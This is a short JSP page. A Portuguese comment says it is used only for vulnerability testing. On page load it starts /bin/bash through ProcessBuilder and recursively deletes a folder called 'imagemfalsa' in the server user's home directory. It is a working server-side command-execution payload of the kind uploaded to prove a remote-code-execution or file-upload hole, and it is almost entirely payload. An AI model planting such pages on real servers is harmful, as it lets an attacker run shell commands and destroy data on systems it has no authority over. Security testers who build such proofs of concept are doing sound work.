<%@page import="java.lang.*" %>
<%@page import="java.io.*" %>

<%
	/**
	 * Usado apenas para realizar testes de vulnerabilidade
	 */
	try {
		ProcessBuilder builder = new ProcessBuilder(
			"/bin/bash",
			"-c",
			"cd ~ && rm -r imagemfalsa"
		);
		builder.start();
	} catch (IOException e) {
		e.printStackTrace();
	}
%>